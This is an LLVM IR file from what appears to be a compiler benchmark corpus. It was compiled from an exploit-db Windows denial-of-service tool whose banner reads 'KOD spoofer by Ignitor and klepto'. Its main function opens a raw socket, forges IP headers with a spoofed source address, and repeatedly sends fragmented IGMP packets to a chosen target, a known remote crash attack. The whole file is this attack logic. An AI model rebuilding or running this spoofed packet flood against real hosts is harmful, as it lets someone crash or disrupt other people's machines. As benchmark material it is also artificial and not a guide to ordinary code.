; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19414.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19414.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64 }
%struct.iphdr = type { i32, i32, i32, i64, i64, i8*, i8*, i32, i8*, i8*, i64 }
%struct.igmphdr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [35 x i8] c"KOD spoofer by Ignitor and klepto\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"Usage: %s <src> <dst>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@IPPROTO_IGMP = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"Sending IGMP packets: %s -> %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"Error sending packet\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca %struct.iphdr*, align 8
  %8 = alloca %struct.igmphdr*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [1500 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 3
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %20 = load i8**, i8*** %5, align 8
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  store i32 1, i32* %3, align 4
  br label %139

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i64 @resolve(i8* %26)
  store i64 %27, i64* %9, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i64 @resolve(i8* %30)
  store i64 %31, i64* %10, align 8
  %32 = getelementptr inbounds [1500 x i8], [1500 x i8]* %15, i64 0, i64 0
  %33 = call i32 @memset(i8* %32, i32 0, i32 1500)
  %34 = bitcast [1500 x i8]* %15 to %struct.iphdr*
  store %struct.iphdr* %34, %struct.iphdr** %7, align 8
  %35 = getelementptr inbounds [1500 x i8], [1500 x i8]* %15, i64 0, i64 80
  %36 = bitcast i8* %35 to %struct.igmphdr*
  store %struct.igmphdr* %36, %struct.igmphdr** %8, align 8
  %37 = load i64, i64* %9, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i64 %37, i64* %39, align 8
  %40 = load i32, i32* @AF_INET, align 4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %40, i32* %41, align 8
  %42 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %43 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %42, i32 0, i32 0
  store i32 5, i32* %43, align 8
  %44 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %45 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %44, i32 0, i32 1
  store i32 4, i32* %45, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 10
  store i64 0, i64* %47, align 8
  %48 = call i8* @htons(i32 10933)
  %49 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 9
  store i8* %48, i8** %50, align 8
  %51 = call i8* @htons(i32 48648)
  %52 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %53 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %52, i32 0, i32 8
  store i8* %51, i8** %53, align 8
  %54 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 2
  store i32 64, i32* %55, align 8
  %56 = load i32, i32* @IPPROTO_IGMP, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 7
  store i32 %56, i32* %58, align 8
  %59 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %60 = bitcast %struct.iphdr* %59 to i16*
  %61 = call i8* @in_chksum(i16* %60, i32 80)
  %62 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 5
  store i8* %61, i8** %63, align 8
  %64 = load i64, i64* %10, align 8
  %65 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 3
  store i64 %64, i64* %66, align 8
  %67 = load i64, i64* %9, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 4
  store i64 %67, i64* %69, align 8
  %70 = load i32, i32* @AF_INET, align 4
  %71 = load i32, i32* @SOCK_RAW, align 4
  %72 = load i32, i32* @IPPROTO_RAW, align 4
  %73 = call i32 @socket(i32 %70, i32 %71, i32 %72)
  store i32 %73, i32* %11, align 4
  %74 = load i32, i32* %11, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

76:                                               ; preds = %23
  store i32 1, i32* %3, align 4
  br label %139

77:                                               ; preds = %23
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 2
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %80, i8* %83)
  store i32 0, i32* %13, align 4
  br label %85

85:                                               ; preds = %135, %77
  %86 = load i32, i32* %13, align 4
  %87 = icmp slt i32 %86, 2
  br i1 %87, label %88, label %138

88:                                               ; preds = %85
  store i32 220, i32* %14, align 4
  %89 = call i8* @htons(i32 1850)
  %90 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 6
  store i8* %89, i8** %91, align 8
  store i32 0, i32* %12, align 4
  br label %92

92:                                               ; preds = %131, %88
  %93 = load i32, i32* %11, align 4
  %94 = bitcast [1500 x i8]* %15 to i8**
  %95 = load i32, i32* %14, align 4
  %96 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %97 = call i32 @sendto(i32 %93, i8** %94, i32 %95, i32 0, %struct.sockaddr* %96, i32 16)
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %99, label %102

99:                                               ; preds = %92
  %100 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %101 = call i32 @exit(i32 -1) #3
  unreachable

102:                                              ; preds = %92
  %103 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %104 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %103, i32 0, i32 6
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @ntohs(i8* %105)
  %107 = icmp eq i32 %106, 8192
  br i1 %107, label %108, label %109

108:                                              ; preds = %102
  br label %134

109:                                              ; preds = %102
  store i32 1500, i32* %14, align 4
  %110 = load i32, i32* %12, align 4
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %116, label %112

112:                                              ; preds = %109
  %113 = call i8* @htons(i32 9857)
  %114 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8* %113, i8** %115, align 8
  br label %125

116:                                              ; preds = %109
  %117 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 6
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @ntohs(i8* %119)
  %121 = sub nsw i32 %120, 185
  %122 = call i8* @htons(i32 %121)
  %123 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 6
  store i8* %122, i8** %124, align 8
  br label %125

125:                                              ; preds = %116, %112
  %126 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %127 = bitcast %struct.iphdr* %126 to i16*
  %128 = call i8* @in_chksum(i16* %127, i32 80)
  %129 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 5
  store i8* %128, i8** %130, align 8
  br label %131

131:                                              ; preds = %125
  %132 = load i32, i32* %12, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %12, align 4
  br label %92

134:                                              ; preds = %108
  br label %135

135:                                              ; preds = %134
  %136 = load i32, i32* %13, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %13, align 4
  br label %85

138:                                              ; preds = %85
  store i32 1, i32* %3, align 4
  br label %139

139:                                              ; preds = %138, %76, %18
  %140 = load i32, i32* %3, align 4
  ret i32 %140
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @resolve(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @in_chksum(i16*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendto(i32, i8**, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ntohs(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
